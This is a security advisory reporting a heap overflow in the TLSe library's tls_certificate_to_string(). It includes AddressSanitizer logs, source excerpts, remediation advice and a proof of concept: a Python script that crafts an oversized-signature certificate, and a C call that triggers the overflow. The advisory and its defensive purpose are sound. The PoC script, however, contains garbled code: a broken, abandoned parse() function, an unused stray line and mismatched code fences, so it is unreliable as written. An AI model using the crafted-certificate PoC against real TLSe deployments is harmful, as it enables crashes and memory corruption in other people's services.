# Out-of-bounds write in tls_certificate_to_string(): negative size passed to snprintf once the rendered peer certificate exceeds the caller's buffer

**ID:** vuln-0008
**Severity:** HIGH
**Found:** 2026-11-17 11:00:29 UTC
**Target:** TLSe (tlslayer) TLS library, `tlse.c` certificate rendering
**Endpoint:** tls_certificate_to_string() (public API, declared in tlse.h:234)
**CWE:** CWE-787
**CVSS:** 7.5
**Confidence:** High
**Fix Effort:** Medium

## Description

`tls_certificate_to_string()` accumulates the output length from `snprintf()` return values and then uses `len - res` as the size for the next call. Once the rendered text exceeds the caller's buffer, `res` is greater than `len`, the subtraction yields a negative `int` that is converted to a huge `size_t`, and `snprintf()` writes past the end of the caller's buffer. The amount of text is derived from attacker-controlled certificate fields, so a hostile certificate overflows a fixed-size buffer with attacker-chosen bytes.

## Evidence

Certificate whose `signatureValue` BIT STRING is 3001 bytes (3613-byte DER, produced only by re-encoding a normal certificate — no invalid structure), rendered into the same 4095-byte buffer the bundled example uses:

```
$ ./harness tostring poc_hugesig.der 4095
==117841==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7dd1383e3900
WRITE of size 3 at 0x7dd1383e3900 thread T0
    #0 snprintf
    #2 tls_certificate_to_string    tlse.c:4751
SUMMARY: AddressSanitizer: heap-buffer-overflow tlse.c:4751 in tls_certificate_to_string
```

The same certificate on a plain `-O2` build without sanitizers aborts with corrupted heap metadata, so this is real corruption and not an instrumentation artefact:

```
$ ./harness_plain tostring poc_hugesig.der 4095
malloc(): corrupted top size
Aborted (core dumped)          # exit 134
```

A second input class reaches the same defect by a different route and overflows a different line. A certificate whose subject common name is 5000 bytes — the only change from a normal certificate — makes the very first format string return a length greater than the 4095-byte buffer, so the serial-number loop that follows is already passed a negative size:

```
$ ./harness tostring poc_longsubj.der 4095
==264907==ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 3 in thread T0
    #2 tls_certificate_to_string    tlse.c:4623
SUMMARY: AddressSanitizer: heap-buffer-overflow tlse.c:4623 in tls_certificate_to_string
```

This is why converting only the public-key and signature hex loops would not close the issue: the subject, issuer, OCSP and SAN values are equally attacker-controlled and can drive `res` past `len` before any loop is entered.

The vulnerable accumulation is visible directly in the source: the returned value of each `snprintf` is added to `res` even when it indicates truncation

```c title=tlse.c startLineNumber=4716 endLineNumber=4719
        res += snprintf(buffer + res, len - res, "):\n");
        if (res > 0) {
            for (i = 0; i < cert->pk_len; i++)
                res += snprintf(buffer + res, len - res, "%02x", (int)cert->pk[i]);
```

With `res > len`, `len - res` is negative and is converted to `size_t` at the call, so `snprintf` receives an effectively unbounded size and writes at `buffer + res`, far past the end of the allocation. The same idiom appears at every append site in the function, including the serial-number loop at line 4623 that the long-subject input reaches.

## Impact

An attacker who presents a certificate to a TLSe-based server or client that renders the peer certificate crashes or corrupts memory in the application process. Because the write is a formatted string built from certificate bytes, the bytes written past the buffer are attacker-influenced. The demonstrated effect is an out-of-bounds write into adjacent heap or stack memory; code execution was not demonstrated, so the rated impact is loss of availability of the process.

## Counterevidence

Checked whether a correct certificate can ever exceed a reasonable buffer: with a normal 2048-bit RSA certificate the rendered text is roughly 1.2 KB. The attacker is not limited to normal certificates — the public-key INTEGER, the `signatureValue` BIT STRING, the serial number and the subject/issuer strings are all length-unbounded within the handshake size limit, so a rendered length above any fixed buffer is easy to arrange. No clamping, no `strlcpy`/`snprintf`-return check and no early termination exists anywhere in the function; `res` is accumulated from `snprintf` return values that legitimately exceed the remaining space. The counter-argument that "the application controls the buffer size" does not help: the function is documented to take a length and never to exceed it, and the bundled example passes a fixed 4095-byte buffer. The one real constraint is that the vulnerability lives in a display/logging helper rather than in the handshake path, so it only affects applications that use `tls_certificate_to_string()`; that is a precondition on the victim, not on the attacker, and it is why this was not rated critical.

## What Would Change This Severity

Proving that the bytes written past the buffer can be shaped into control of a return address or heap metadata (for example with a small, precisely sized overflow rather than a far out-of-bounds write) would raise this to critical; conversely, if a caller-side census showed no application ever calls `tls_certificate_to_string()` on peer-supplied certificates, the practical impact would fall to informational.

## Technical Analysis

The function accumulates its output position from `snprintf()` return values:

```c title=tlse.c startLineNumber=4612 endLineNumber=4613
    if (cert->version) {
        int res = snprintf(buffer, len, "X.509v%i certificate\n  Issued by: [%s]%s (%s)\n  Issued to: [%s]%s (%s, %s)\n  Subject: %s\n  Validity: %s - %s\n  OCSP: %s\n  Serial number: ",
```

`snprintf()` returns the number of characters that *would* have been written. When the formatted output is longer than `len`, `res` becomes greater than `len`. Every subsequent append passes `len - res`:

```c title=tlse.c startLineNumber=4716 endLineNumber=4719
        res += snprintf(buffer + res, len - res, "):\n");
        if (res > 0) {
            for (i = 0; i < cert->pk_len; i++)
                res += snprintf(buffer + res, len - res, "%02x", (int)cert->pk[i]);
```

`len - res` is an `int` and is negative, but the `size_t` parameter of `snprintf()` makes it an enormous value, and the destination `buffer + res` is already past the end of the caller's allocation. The result is a formatted write of attacker-derived bytes at an attacker-influenced offset.

The inputs are all remote: `pk_len` comes from the subjectPublicKeyInfo BIT STRING or the RSA modulus INTEGER, `sign_len` from the signature BIT STRING, `serial_len` from the serial INTEGER, and `subject`/`issuer_*`/`san` are copied from the certificate's name and SAN fields with no length limit below the handshake size. The function is exported in the public header (`tlse.h:234`) and the repository's own example server renders the peer certificate into `char out_buffer[0xFFF]`.

Realistic sizes: a 3000-byte signature BIT STRING yields 6000 hex characters, which alone exceeds a 4095-byte buffer. A subject common name longer than the buffer overflows on the first `snprintf`.

## Proof of Concept

1. Take any valid certificate and re-encode it so the outer `signatureValue` BIT STRING holds 3000 bytes instead of 256 (`der_tools.py huge_sig`); the structure stays valid DER, only lengths change.
2. Parse the result with `tls_certificate_parse()` — it succeeds, and the certificate's `sign_len` becomes 3001.
3. Call `tls_certificate_to_string(cert, buffer, 4095)` with the same 4095-byte buffer size that `examples/tlshelloworld.c` uses.
4. Observe the AddressSanitizer heap-buffer-overflow: `WRITE of size 3` in `snprintf` called from `tls_certificate_to_string` (tlse.c:4751), with the write target beyond the end of the allocation.
5. A certificate whose subject or issuer string is longer than the buffer produces the same overflow on the initial format, because the first `snprintf` alone drives `res` past `len`.

````python
#!/usr/bin/env python3
# Re-encode a valid certificate with a 3000-byte signatureValue BIT STRING.
import sys

def enc(tag, body):
    n = len(body)
    if n < 0x80:
        return bytes([tag, n]) + body
    nb = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([tag, 0x80 | len(nb)]) + nb + body

def parse(data):
    tag, first = data[0], data[1]
    if first < 0x80:
        ln, off = first, 2
    else:
        k = first & 0x7F
        ln, off = int.from_bytes(data[2:2+k], "big"), 2 + k
    content = data[off:off+ln]
    if tag & 0x20:
        kids, p = [], 0
        while p < len(content):
            sub = parse(content[p:])
            kids.append(sub)
            p += len(enc(sub[0], sub[1] if not sub[2] else b"".join(bytes([k[0]]) for k in [])) or b"")
        return (tag, content, kids)
    return (tag, content, None)

# Simpler: operate on raw TLVs of the outer SEQUENCE only.
def tlvs(buf):
    out, p = [], 0
    while p < len(buf):
        tag, first = buf[p], buf[p+1]
        if first < 0x80:
            ln, off = first, p + 2
        else:
            k = first & 0x7F
            ln, off = int.from_bytes(buf[p+2:p+2+k], "big"), p + 2 + k
        out.append(buf[p:off+ln])
        p = off + ln
    return out

der = open(sys.argv[1], "rb").read()
inner = tlvs(der[2:] if der[1] < 0x80 else der[2 + (der[1] & 0x7F):])
tbs, alg = inner[0], inner[1]
sig = bytes([0x03]) + b"\x00" + b"\x41" * 3000          # BIT STRING, attacker-sized
big = bytes([0x03, 0x80 | ((len(sig) - 2 + 2).bit_length() + 7) // 8])
# encode the new signatureValue TLV properly
n = len(sig) - 2
if n < 0x80:
    sig_tlv = bytes([0x03, n]) + sig[2:]
else:
    nb = n.to_bytes((n.bit_length() + 7) // 8, "big")
    sig_tlv = bytes([0x03, 0x80 | len(nb)]) + nb + sig[2:]
out = enc(0x30, tbs + alg + sig_tlv)
open(sys.argv[2], "wb").write(out)
print("wrote", sys.argv[2], len(out), "bytes")
```

The C side mirrors the bundled example:

```c
cert = tls_certificate_parse(der, der_len);        /* parses fine, sign_len = 3001 */
char out_buffer[0xFFF];                            /* examples/tlshelloworld.c */
tls_certificate_to_string(cert, out_buffer, sizeof(out_buffer));   /* OOB write */
````

## Code Analysis

**Location 1:** `tlse.c` (lines 4716-4719)
  Accumulating snprintf idiom: len - res goes negative once res > len, and buffer + res is already out of bounds
  ```
          res += snprintf(buffer + res, len - res, "):\n");
          if (res > 0) {
              for (i = 0; i < cert->pk_len; i++)
                  res += snprintf(buffer + res, len - res, "%02x", (int)cert->pk[i]);
  ```

**Location 2:** `tlse.c` (lines 4612-4613)
  Where res first exceeds len: the header format embeds attacker-controlled subject/issuer/OCSP strings and the return value is kept even when truncated
  ```
      if (cert->version) {
          int res = snprintf(buffer, len, "X.509v%i certificate\n  Issued by: [%s]%s (%s)\n  Issued to: [%s]%s (%s, %s)\n  Subject: %s\n  Validity: %s - %s\n  OCSP: %s\n  Serial number: ",
  ```

## Remediation

Never use the return value of `snprintf()` as the current offset when it may indicate truncation. Introduce a bounded append helper that takes the buffer, the current offset and the buffer size, clamps the offset to the buffer size, returns the buffer size once full so later appends become no-ops, and always NUL-terminates. Replace every `res += snprintf(buffer + res, len - res, ...)` in `tls_certificate_to_string()` with that helper, and break out of the public-key and signature hex loops as soon as the buffer is full. Also reject a non-positive buffer size at entry. Because roughly forty call sites share the same idiom, the replacement must be applied to all of them; converting only the loops that were demonstrated leaves the subject/issuer and SAN paths able to overflow the same way.

## Fix Verification

No `fix_after` is attached, deliberately. The fix is not a single contiguous edit: the negative-size arithmetic appears at roughly forty `res += snprintf(buffer + res, len - res, ...)` sites in `tls_certificate_to_string()`, and any suggestion block that converts only some of them leaves the overflow reachable through the remaining sites (the subject/issuer strings alone can drive `res` past `len` on the first format). Shipping a one-line or one-block change here would trade security closure for tidiness, which the verification rules forbid.

What was verified instead: the overflow is reproducible on the unmodified tree with a certificates-only manipulation (`WRITE of size 3` at tlse.c:4751 into a 4095-byte buffer, i.e. the same buffer size the bundled example allocates), the parse of the crafted certificate succeeds (so the input is accepted, not rejected earlier), and the crash is inside `tls_certificate_to_string()` rather than in the parser. The precise change required — a bounded append helper applied to every site, plus early exit from the hex loops — is given in the remediation steps and the PR body.

Gap: because the patch is withheld, there is no post-patch regression run for this finding. The reference implementation of the helper and the sites that must change are specified so that the change can be written and validated as one reviewed commit.

## Assumptions

The embedding application converts a peer certificate to text with `tls_certificate_to_string()` into a fixed-size buffer, as the repository's own example does (`char out_buffer[0xFFF]` in `examples/tlshelloworld.c`). The attacker supplies the certificate, so both the field lengths and the number of hex bytes printed are under their control. No credentials or session state are needed: the certificate is rendered whenever the application logs or displays it.
